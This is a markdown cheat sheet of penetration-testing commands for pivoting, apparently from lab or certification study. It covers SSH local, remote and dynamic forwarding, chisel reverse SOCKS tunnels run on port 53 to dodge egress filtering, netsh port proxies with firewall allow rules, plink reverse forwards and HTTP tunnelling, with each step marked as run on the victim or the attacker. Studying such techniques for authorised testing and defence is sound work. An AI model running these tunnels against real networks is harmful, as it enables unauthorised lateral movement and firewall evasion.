# Pivoting

HackTricks: https://book.hacktricks.xyz/tunneling-and-port-forwarding

[Chrome extension](https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm/related?hl=en) to filter what HTTP request goes through the proxy

## Port Forwarding
```sh
# Forward 0.0.0.0:80 to google.com:80
┌──(grenierdev㉿kali)-[~]
└─$ echo '0.0.0.0 80 142.251.41.46 80' | sudo tee -a /etc/rinetd.conf

┌──(grenierdev㉿kali)-[~]
└─$ sudo systemctl restart rinetd
```

## SSH Tunneling

### Prep SSH keys for safe tunnelling
```sh
# Victim
root@debian:~# ssh-keygen
root@debian:~# cat ~/.ssh/id_rsa.pub

# Attacker
┌──(grenierdev㉿kali)-[~]
└─$ echo 'from="vicim_ip",command="echo Port Forwarding Only",no-agent-forwarding,no-X11-forwarding,no-pty output_from_id_rsa.pub' >> ~/.ssh/authorized_keys
```

### Local Port Forwading
```sh
# Attacker, forward local port 445 to 172.16.247.5:445 through 192.168.247.44
┌──(grenierdev㉿kali)-[~]
└─$ sudo ssh -p 2222 -N -L 0.0.0.0:445:172.16.247.5:445 student@192.168.247.44

┌──(grenierdev㉿kali)-[~]
└─$ smbclient -L 127.0.0.1 -U Administrator
Enter WORKGROUP\Administrator's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
...
```

### Remote Port Forwading

> `/etc/ssh/sshd_config` should have `GatewayPorts yes` or else the binding will be limited to `127.0.0.1, ::1`

```sh
# Victim, forward local port 5555 to 127.0.0.1:4444 through 192.168.119.247
root@debian:~# ssh -i /.ssh/id_rsa -N -R 127.0.0.1:4444:127.0.0.1:5555 grenierdev@192.168.119.247

# Attacker
┌──(grenierdev㉿kali)-[~]
└─$ netstat -natup             
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      -
```

### Dynamic Port Forwarding
```sh
# Attacker, proxy all network through 127.0.0.1:1080 to 192.168.247.52
┌──(grenierdev㉿kali)-[~]
└─$ ssh -p 2222 -N -D 127.0.0.1:1080 victim@192.168.247.52

┌──(grenierdev㉿kali)-[~]
└─$ proxychains -q firefox 'http://127.0.0.1/wp-login.php'
```

### Dynamic Reverse Port Forwarding
```sh
# Victim, proxy all network through attacker's 127.0.0.1:1080
┌──(grenierdev㉿kali)-[~]
└─$ ssh -N -R 1080 grenierdev@192.168.247.52

┌──(grenierdev㉿kali)-[~]
└─$ proxychains -q firefox 'http://127.0.0.1/wp-login.php'
```


## Windows

- Plink at `/usr/share/windows-resources/binaries/plink.exe`
- [Chisel](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz)

### Dynamic Port Forwarding
```sh
# Attacker, create chisel server on port 53 (common port, not blocked)
┌──(grenierdev㉿kali)-[~]
└─$ sudo chisel server -p 53 --socks5 --reverse

# Victim, connect to chisel server on port 53 and open a tunnel on port 1081
PS C:\Users\Public> .\chisel.exe client 192.168.119.226:53 R:1081:socks

# Attacker now has a tunnel to victim on port 1081
┌──(grenierdev㉿kali)-[~]
└─$ curl -x socks5://127.0.0.1:1081 -ski 'http://127.0.0.1:8080/'
```

### Port Forwarding

```sh
# Forward local port 4455 to 172.16.247.5:445
C:\> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.247.5

# Allow inbound connection to 4455
C:\> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localport=4455 action=allow
```


### Remote Port Forwarding

```sh
# Victim, forward local port 3306 to 192.168.119.247:8306 through 192.168.119.247
C:\> plink.exe -ssh -l grenierdev -pw ilak -R 192.168.119.247:8306:127.0.0.1:3306 192.168.119.247

# Attacker
┌──(grenierdev㉿kali)-[~]
└─$ netstat -natup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:8306                :::*                    LISTEN      -  


# Attacker, create chisel server on port 53 (common port, not blocked)
┌──(grenierdev㉿kali)-[~]
└─$ sudo chisel server -p 53 --reverse

# Victim, connect to chisel server on port 53 and forward local port 80 to attacker port 8080
PS C:\Users\Public> .\chisel.exe client 192.168.119.226:53 R:8080:127.0.0.1:80
```

## HTTP Tunneling
```sh
# Forward local port 8888 to 172.16.247.5:3389 through student@127.0.0.1
victim@server:~$ ssh -L 0.0.0.0:8888:172.16.247.5:3389 student@127.0.0.1

# Forward HTTP connection made to 1234 to 0.0.0.0:8888
victim@server:~$ hts --forward-port 0.0.0.0:8888 1234

# Forward port 8080 through HTTP connection to 192.168.247.44:1234
attacker@kali:~$ htc --forward-port 8080 192.168.247.44:1234

# Connect to 172.16.247.5:3389 through HTTP tunnel between 127.0.0.1:8080 -> 192.168.247.44:1234
attacker@kali:~$ rdesktop -z -P -x m 127.0.0.1:8080
```